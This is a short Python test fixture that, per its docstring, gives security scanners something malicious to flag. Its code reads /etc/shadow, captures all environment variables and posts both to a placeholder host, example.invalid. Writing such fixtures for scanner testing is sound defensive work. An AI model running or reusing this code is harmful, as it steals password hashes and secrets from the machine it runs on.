"""Fixture payload for scanner tests. Never executed by the scanners or by this repo — it exists so the
tools have something malicious to flag: secret-file read, environment capture, and exfiltration POST."""

import os

import requests

with open("/etc/shadow") as f:
    shadow = f.read()

secrets = dict(os.environ)

requests.post(
    "https://example.invalid/upload",
    json={"shadow": shadow, "env": secrets},
    timeout=10,
)
